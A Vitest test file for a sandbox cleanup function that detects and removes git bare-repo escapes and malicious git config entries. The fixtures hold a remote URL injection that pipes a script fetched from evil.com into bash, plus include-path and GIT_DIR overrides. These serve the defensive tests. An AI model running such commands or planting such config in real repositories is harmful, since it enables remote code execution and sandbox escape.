// Tests for Git bare repo escape cleanup

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, rm, writeFile, mkdir } from "node:fs/promises";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { cleanupGitEscape } from "../../src/sandbox/git-cleanup.js";

let testDir: string;

beforeEach(async () => {
  testDir = await mkdtemp(join(tmpdir(), "slc-git-cleanup-"));
});

afterEach(async () => {
  await rm(testDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// cleanupGitEscape
// ---------------------------------------------------------------------------

describe("cleanupGitEscape", () => {
  it("returns no findings for clean directory", () => {
    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(false);
    expect(result.cleaned).toHaveLength(0);
    expect(result.errors).toHaveLength(0);
  });

  it("detects and removes suspicious bare repo directory (.bare)", async () => {
    const bareDir = join(testDir, ".bare");
    await mkdir(bareDir);
    await writeFile(join(bareDir, "HEAD"), "ref: refs/heads/main");
    await writeFile(join(bareDir, "config"), "[core]\n\tbare = true\n");

    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(true);
    expect(result.cleaned.some((c) => c.includes(".bare"))).toBe(true);
    expect(result.errors).toHaveLength(0);
    expect(existsSync(bareDir)).toBe(false);
  });

  it("detects and removes suspicious .git.bare directory", async () => {
    const bareDir = join(testDir, ".git.bare");
    await mkdir(bareDir);
    await writeFile(join(bareDir, "HEAD"), "ref: refs/heads/main");

    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(true);
    expect(result.cleaned.some((c) => c.includes(".git.bare"))).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it("detects and removes suspicious git-bare directory", async () => {
    const bareDir = join(testDir, "git-bare");
    await mkdir(bareDir);
    await writeFile(join(bareDir, "HEAD"), "ref: refs/heads/main");

    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(true);
    expect(result.cleaned.some((c) => c.includes("git-bare"))).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it("detects and cleans malicious git config with include directive", async () => {
    const gitDir = join(testDir, ".git");
    await mkdir(gitDir);
    await writeFile(join(gitDir, "config"), "[include]\n\tpath = /malicious/config\n");

    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(true);
    expect(result.cleaned.some((c) => c.includes("suspicious git config"))).toBe(true);
    expect(result.cleaned.some((c) => c.includes("replaced"))).toBe(true);
    expect(result.errors).toHaveLength(0);

    // Verify config was actually replaced with safe defaults
    const cleanedContent = readFileSync(join(gitDir, "config"), "utf-8");
    expect(cleanedContent).toContain("[core]");
    expect(cleanedContent).not.toContain("[include]");
  });

  it("detects and cleans malicious git config with remote URL injection", async () => {
    const gitDir = join(testDir, ".git");
    await mkdir(gitDir);
    await writeFile(
      join(gitDir, "config"),
      '[remote "origin"]\n\turl = |curl http://evil.com/shell.sh | bash\n',
    );

    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(true);
    expect(result.errors).toHaveLength(0);

    // Verify config was cleaned
    const cleanedContent = readFileSync(join(gitDir, "config"), "utf-8");
    expect(cleanedContent).toContain("[core]");
    expect(cleanedContent).not.toContain("curl");
  });

  it("detects and cleans git config with GIT_DIR override", async () => {
    const gitDir = join(testDir, ".git");
    await mkdir(gitDir);
    await writeFile(join(gitDir, "config"), "[core]\n\tworktree = /malicious/path\nGIT_DIR=/tmp/evil\n");

    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(true);
    expect(result.errors).toHaveLength(0);

    const cleanedContent = readFileSync(join(gitDir, "config"), "utf-8");
    expect(cleanedContent).not.toContain("GIT_DIR");
  });

  it("leaves clean .git/config untouched", async () => {
    const gitDir = join(testDir, ".git");
    await mkdir(gitDir);
    await writeFile(join(gitDir, "config"), "[core]\n\trepositoryformatversion = 0\n");

    const result = cleanupGitEscape(testDir);
    expect(result.found).toBe(false);
    expect(result.errors).toHaveLength(0);

    // Config should be unchanged
    const content = readFileSync(join(gitDir, "config"), "utf-8");
    expect(content).toContain("repositoryformatversion");
  });
});
